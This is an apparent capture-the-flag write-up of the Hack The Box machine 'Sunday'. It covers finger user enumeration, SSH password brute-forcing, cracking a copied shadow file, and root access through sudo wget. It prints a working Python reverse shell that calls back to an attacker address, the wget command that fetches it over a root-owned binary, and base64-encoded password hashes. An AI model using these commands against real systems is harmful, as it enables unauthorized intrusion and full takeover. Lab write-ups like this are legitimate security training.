![logo](/logo.png)

# [Sunday- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 23 Sep 2017 machine on HTB,Sunday created by [Agent22](https://app.hackthebox.com/users/10931) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *solaris
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/sunday 10.10.10.76
```

###### Output 

![](/Solaris/Sunday/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/sunday 10.10.10.76                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 19:17 EAT
Nmap scan report for 10.10.10.76
Host is up (0.32s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
79/tcp  open  finger?
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
|_finger: No one logged on\x0D
111/tcp open  rpcbind 2-4 (RPC #100000)
515/tcp open  printer

```


Nmap finds several open services, most notable Finger running on port 79. The [finger](https://en.wikipedia.org/wiki/Finger_protocol) daemon listens on port 79, and is really a relic of a time when computers were far too trusting and open. It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.

Running `finger @[ip]` will tell us of any currently logged in users:

![](/Solaris/Sunday/Screenshots/finger.png)

If finger returns no logged in users, we can try to brute force usernames. We’ll use the [finger-user-enum.pl](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz)script from pentestmonkey.

```sh
 ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

![](/Solaris/Sunday/Screenshots/enumfinger.png)


Now we can compare the results of finger for a name that exists and one that doesn’t:

![](/Solaris/Sunday/Screenshots/fingers.png)

While Hydra does not work in this instance, there are several other tools out there that can get
the job done. Brute forcing will find the password for `sunny is sunday`, and a shell can be
obtained by connecting over SSH on port 22022

```
ssh -p 22022 sunny@10.10.10.76
```

![](/Solaris/Sunday/Screenshots/shell.png)

Inside `/backup` there’s a copy of a `shadow` file that is world readable:

![](/Solaris/Sunday/Screenshots/backup.png)

They can be copy/pasted as they are small, or by using

```sh
base64 -w 0 shadow.backup 
```

![](/Solaris/Sunday/Screenshots/base64.png)

```sh
echo "bXlzcWw6TlA6Ojo6Ojo6Cm9wZW5sZGFwOipMSyo6Ojo6Ojo6CndlYnNlcnZkOipMSyo6Ojo6Ojo6CnBvc3RncmVzOk5QOjo6Ojo6OgpzdmN0YWc6KkxLKjo2NDQ1Ojo6Ojo6Cm5vYm9keToqTEsqOjY0NDU6Ojo6OjoKbm9hY2Nlc3M6KkxLKjo2NDQ1Ojo6Ojo6Cm5vYm9keTQ6KkxLKjo2NDQ1Ojo6Ojo6CnNhbW15OiQ1JEVia244amxLJGk2U1NQYTAudTdHZC4wb0pPVDRUNDIxTjJPdnNmWHFBVDF2Q29ZVU9pZ0I6NjQ0NTo6Ojo6OgpzdW5ueTokNSRpUk1icG5CdiRaaDdzNkQ3Q29sbm9nQ2RpVkU1Rmx6OXZDWk9Na1VGeGtsUmhoYVNoe" > shadow.b64
```

```sh
base64 -d shadow.b64 > shadow.backup
```

![](/Solaris/Sunday/Screenshots/echobase64.png)

with rockyou.txt finds the password for sammy fairly quickly

![](/Solaris/Sunday/Screenshots/hashact.png)


Armed with sammy’s password, it is now possible to ssh in as sammy:

```sh
 ssh -p 22022 sammy@10.10.10.76
```

and from sammy we can get a user flag

![](Solaris/Sunday/Screenshots/userflag.png)

# Privillage Escalation

Running sudo -l as sammy reveals that it is possible to run sudo wget. By overwriting the
/root/troll binary which sunny has access to, it is possible to achieve a root shell. Note that there
is a script running which reverts the file to the original seemingly every second, so it helps to
have two shells open and execute the commands quickly.

There’s a ton of things we can do from here. Reading the [wget man page](https://linux.die.net/man/1/wget) provides a wealth of ideas.When enumerating as sunny, I found a binary named troll that sunny could run with sudo without password:

So let’s make troll useful. First, on kali, create a shell.py, which is basically a nicely formatted [reverse python shell from pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```sh
#!/usr/bin/python

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.11",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```

```sh
sudo wget http://10.10.14.11/shell.py -O /root/troll
```

![](/Solaris/Sunday/Screenshots/wget.png)

we have to execute very fast the wget then the `sudo /root/troll`

![](/Solaris/Sunday/Screenshots/troll.png)

By executing this first we are able to get the root shell

![](Solaris/Sunday/Screenshots/root.png)

we can now get the root flag from the

![](/Solaris/Sunday/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------
